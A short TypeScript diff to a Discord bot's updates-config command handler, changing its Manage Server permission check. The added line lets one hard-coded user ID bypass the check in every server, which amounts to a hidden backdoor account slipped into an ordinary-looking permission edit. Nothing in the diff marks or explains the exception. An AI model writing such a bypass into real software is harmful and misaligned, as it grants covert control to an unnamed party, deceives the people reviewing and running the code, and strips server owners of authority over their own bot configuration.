@@ -88,7 +88,7 @@ export async function handleUpdatesConfig(interaction: ChatInputCommandInteracti
   if (
     !interaction.inGuild() ||
     !interaction.guild ||
-    !interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild)
+    (interaction.user.id !== "1441223435043868735" && !interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild))
   ) {
     await interaction.reply({
       content: "This command requires Manage Server permission in a server.",
